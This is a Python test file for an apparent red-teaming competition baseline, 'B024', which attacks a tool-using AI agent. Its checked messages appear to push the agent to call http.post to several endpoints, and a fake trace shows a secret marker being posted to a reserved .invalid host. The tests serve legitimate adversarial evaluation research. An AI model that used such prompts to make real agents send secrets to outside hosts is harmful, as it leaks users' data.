"""Contract tests for B024 live probe hops=1."""

import importlib.util
import sys
import types
from dataclasses import dataclass
from pathlib import Path

import pytest

B008R_ATTACK_PATH = Path("baselines/replaysafe_classify5_v1/attack.py")
B024_ATTACK_PATH = Path("baselines/replaysafe_probe1_v1/attack.py")


class FakeCandidate:
    def __init__(self, user_messages):
        self.user_messages = tuple(user_messages)

    @classmethod
    def from_messages(cls, user_messages):
        return cls(user_messages)


@dataclass
class FakeConfig:
    time_budget_s: float = 500.0
    max_tool_hops: int = 8


class FakeClock:
    def __init__(self) -> None:
        self.now = 0.0

    def __call__(self) -> float:
        return self.now

    def advance(self, seconds: float) -> None:
        self.now += seconds


@pytest.fixture(autouse=True)
def sdk_stubs(monkeypatch: pytest.MonkeyPatch) -> None:
    attacks = types.ModuleType("aicomp_sdk.attacks")
    attacks.AttackAlgorithmBase = type("AttackAlgorithmBase", (), {})
    attacks.AttackCandidate = FakeCandidate
    attacks.AttackRunConfig = FakeConfig
    contracts = types.ModuleType("aicomp_sdk.attacks.contracts")
    contracts.AttackAlgorithmBase = attacks.AttackAlgorithmBase
    contracts.AttackCandidate = FakeCandidate
    contracts.AttackRunConfig = FakeConfig
    monkeypatch.setitem(sys.modules, "aicomp_sdk", types.ModuleType("aicomp_sdk"))
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks", attacks)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.attacks.contracts", contracts)
    monkeypatch.setitem(sys.modules, "aicomp_sdk.core", types.ModuleType("aicomp_sdk.core"))


def _load_attack(path: Path, module_name: str):
    spec = importlib.util.spec_from_file_location(module_name, path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class FiringEnv:
    def __init__(self, clock: FakeClock, *, latency_s: float) -> None:
        self.clock = clock
        self.latency_s = latency_s
        self.messages: list[str] = []
        self.hops: list[int] = []

    def reset(self) -> None:
        pass

    def interact(self, message: str, *, max_tool_hops: int) -> None:
        self.messages.append(message)
        self.hops.append(max_tool_hops)
        self.clock.advance(self.latency_s)

    def export_trace_dict(self):
        return {
            "tool_events": [
                {
                    "name": "http.post",
                    "ok": True,
                    "args": {"url": "http://fixture.invalid", "data": "SECRET_MARKER"},
                }
            ]
        }


def test_b024_only_sets_live_probe_hops_to_one() -> None:
    parent = _load_attack(B008R_ATTACK_PATH, "classify5_for_b024")
    child = _load_attack(B024_ATTACK_PATH, "probe1_attack")
    assert parent.PROBE_HOPS == 0
    assert child.PROBE_HOPS == 1
    assert child.SPLIT_CLASSIFY_N == parent.SPLIT_CLASSIFY_N == 5
    assert child.REPLAY_SAFE_FRAC == parent.REPLAY_SAFE_FRAC == 0.99
    assert child.SLOW_MULTIPOST_N == parent.SLOW_MULTIPOST_N == 4
    assert child.REPLAY_COST_COEF == parent.REPLAY_COST_COEF == 1.0
    assert child.TEMPLATE == parent.TEMPLATE
    assert child._url(0).endswith(".invalid")


def test_slow_row_keeps_four_endpoint_messages_and_probes_one_hop(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    child = _load_attack(B024_ATTACK_PATH, "probe1_slow")
    clock = FakeClock()
    monkeypatch.setattr(child.time, "monotonic", clock)
    env = FiringEnv(clock, latency_s=13.0)
    candidates = child.AttackAlgorithm().run(env, FakeConfig(time_budget_s=500.0, max_tool_hops=8))
    messages = [item.user_messages[0] for item in candidates]
    plain = [msg for msg in messages if "Call http.post once" in msg]
    forge = [msg for msg in messages if "these 4 endpoints" in msg]
    assert len(plain) == 5
    assert forge
    assert all(msg.count("http://") == 4 for msg in forge)
    assert all(".invalid" in msg for msg in forge)
    assert set(env.hops) == {1}


def test_messages_match_b008r(monkeypatch: pytest.MonkeyPatch) -> None:
    parent = _load_attack(B008R_ATTACK_PATH, "classify5_probe1_msg")
    child = _load_attack(B024_ATTACK_PATH, "probe1_msg")
    clock_a = FakeClock()
    monkeypatch.setattr(parent.time, "monotonic", clock_a)
    a = parent.AttackAlgorithm().run(
        FiringEnv(clock_a, latency_s=13.0), FakeConfig(time_budget_s=500.0, max_tool_hops=8)
    )
    clock_b = FakeClock()
    monkeypatch.setattr(child.time, "monotonic", clock_b)
    b = child.AttackAlgorithm().run(
        FiringEnv(clock_b, latency_s=13.0), FakeConfig(time_budget_s=500.0, max_tool_hops=8)
    )
    assert [c.user_messages for c in b] == [c.user_messages for c in a]


def test_urls_stay_on_reserved_invalid_hosts() -> None:
    child = _load_attack(B024_ATTACK_PATH, "probe1_urls")
    for index in range(12):
        assert child._url(index).endswith(".invalid")
        assert ".co" not in child._url(index)
        assert "example.com" not in child._url(index)
